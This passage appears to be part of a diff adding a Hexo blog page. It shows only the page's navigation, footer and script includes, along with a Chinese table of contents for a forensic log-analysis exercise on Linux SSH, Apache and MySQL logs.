class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E4%BA%A4%E5%BD%93%E5%A4%A9%E8%AE%BF%E9%97%AE%E6%AC%A1%E6%95%B0%E6%9C%80%E5%A4%9A%E7%9A%84IP%EF%BC%8C%E5%8D%B3%E9%BB%91%E5%AE%A2IP%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">提交当天访问次数最多的IP，即黑客IP：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%87%E7%BA%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%8C%87%E7%BA%B9%E7%9A%84md5%EF%BC%9A"><span class="nav-number">2.2.</span> <span class="nav-text">黑客使用的浏览器指纹是什么，提交指纹的md5：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Bindex-php%E9%A1%B5%E9%9D%A2%E8%A2%AB%E8%AE%BF%E9%97%AE%E7%9A%84%E6%AC%A1%E6%95%B0%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%AC%A1%E6%95%B0%EF%BC%9A"><span class="nav-number">2.3.</span> <span class="nav-text">查看index.php页面被访问的次数，提交次数：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E9%BB%91%E5%AE%A2IP%E8%AE%BF%E9%97%AE%E4%BA%86%E5%A4%9A%E5%B0%91%E6%AC%A1%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%AC%A1%E6%95%B0%EF%BC%9A"><span class="nav-number">2.4.</span> <span class="nav-text">查看黑客IP访问了多少次，提交次数：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B2023%E5%B9%B48%E6%9C%8803%E6%97%A58%E6%97%B6%E8%BF%99%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%97%B6%E5%86%85%E6%9C%89%E5%A4%9A%E5%B0%91IP%E8%AE%BF%E9%97%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%AC%A1%E6%95%B0"><span class="nav-number">2.5.</span> <span class="nav-text">查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">mysql日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%99%E5%85%A5%E7%9A%84shell-flag-%E5%85%B3%E9%94%AE%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">3.1.</span> <span class="nav-text">黑客第一次写入的shell flag{关键字符串}</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E5%8F%8D%E5%BC%B9shell%E7%9A%84ip-flag-ip"><span class="nav-number">3.2.</span> <span class="nav-text">黑客反弹shell的ip flag{ip}</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84-md5-flag-md5-%E6%B3%A8-xxx-xxx-xxx-xxx-xxx-xx"><span class="nav-number">3.3.</span> <span class="nav-text">黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E8%8E%B7%E5%8F%96%E7%9A%84%E6%9D%83%E9%99%90-flag-whoami%E5%90%8E%E7%9A%84%E5%80%BC"><span class="nav-number">3.4.</span> <span class="nav-text">黑客获取的权限 flag{whoami后的值}</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">FLow</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">linux日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%89%E5%A4%9A%E5%B0%91IP%E5%9C%A8%E7%88%86%E7%A0%B4%E4%B8%BB%E6%9C%BAssh%E7%9A%84root%E5%B8%90%E5%8F%B7%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%E5%A4%9A%E4%B8%AA%E4%BD%BF%E7%94%A8%E2%80%9D-%E2%80%9D%E5%88%86%E5%89%B2"><span class="nav-number">1.1.</span> <span class="nav-text">有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F%E7%99%BB%E9%99%86%E7%9A%84IP%E6%98%AF%E5%A4%9A%E5%B0%91%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%E5%A4%9A%E4%B8%AA%E4%BD%BF%E7%94%A8%E2%80%9D-%E2%80%9D%E5%88%86%E5%89%B2"><span class="nav-number">1.2.</span> <span class="nav-text">ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D%E5%AD%97%E5%85%B8%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E5%A6%82%E6%9E%9C%E6%9C%89%E5%A4%9A%E4%B8%AA%E4%BD%BF%E7%94%A8%E2%80%9D-%E2%80%9D%E5%88%86%E5%89%B2"><span class="nav-number">1.3.</span> <span class="nav-text">爆破用户名字典是什么？如果有多个使用”,”分割</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F%E7%9A%84IP%E5%85%B1%E7%88%86%E7%A0%B4%E4%BA%86%E5%A4%9A%E5%B0%91%E6%AC%A1"><span class="nav-number">1.4.</span> <span class="nav-text">登陆成功的IP共爆破了多少次</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E7%99%BB%E9%99%86%E4%B8%BB%E6%9C%BA%E5%90%8E%E6%96%B0%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%EF%BC%8C%E7%94%A8%E6%88%B7%E5%90%8D%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="nav-number">1.5.</span> <span class="nav-text">黑客登陆主机后新建了一个后门用户，用户名是多少</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">apache日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E4%BA%A4%E5%BD%93%E5%A4%A9%E8%AE%BF%E9%97%AE%E6%AC%A1%E6%95%B0%E6%9C%80%E5%A4%9A%E7%9A%84IP%EF%BC%8C%E5%8D%B3%E9%BB%91%E5%AE%A2IP%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">提交当天访问次数最多的IP，即黑客IP：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%87%E7%BA%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%8C%87%E7%BA%B9%E7%9A%84md5%EF%BC%9A"><span class="nav-number">2.2.</span> <span class="nav-text">黑客使用的浏览器指纹是什么，提交指纹的md5：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Bindex-php%E9%A1%B5%E9%9D%A2%E8%A2%AB%E8%AE%BF%E9%97%AE%E7%9A%84%E6%AC%A1%E6%95%B0%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%AC%A1%E6%95%B0%EF%BC%9A"><span class="nav-number">2.3.</span> <span class="nav-text">查看index.php页面被访问的次数，提交次数：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E9%BB%91%E5%AE%A2IP%E8%AE%BF%E9%97%AE%E4%BA%86%E5%A4%9A%E5%B0%91%E6%AC%A1%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%AC%A1%E6%95%B0%EF%BC%9A"><span class="nav-number">2.4.</span> <span class="nav-text">查看黑客IP访问了多少次，提交次数：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B2023%E5%B9%B48%E6%9C%8803%E6%97%A58%E6%97%B6%E8%BF%99%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%97%B6%E5%86%85%E6%9C%89%E5%A4%9A%E5%B0%91IP%E8%AE%BF%E9%97%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%AC%A1%E6%95%B0"><span class="nav-number">2.5.</span> <span class="nav-text">查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">mysql日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%99%E5%85%A5%E7%9A%84shell-flag-%E5%85%B3%E9%94%AE%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">3.1.</span> <span class="nav-text">黑客第一次写入的shell flag{关键字符串}</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E5%8F%8D%E5%BC%B9shell%E7%9A%84ip-flag-ip"><span class="nav-number">3.2.</span> <span class="nav-text">黑客反弹shell的ip flag{ip}</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84-md5-flag-md5-%E6%B3%A8-xxx-xxx-xxx-xxx-xxx-xx"><span class="nav-number">3.3.</span> <span class="nav-text">黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E8%8E%B7%E5%8F%96%E7%9A%84%E6%9D%83%E9%99%90-flag-whoami%E5%90%8E%E7%9A%84%E5%80%BC"><span class="nav-number">3.4.</span> <span class="nav-text">黑客获取的权限 flag{whoami后的值}</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local-search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
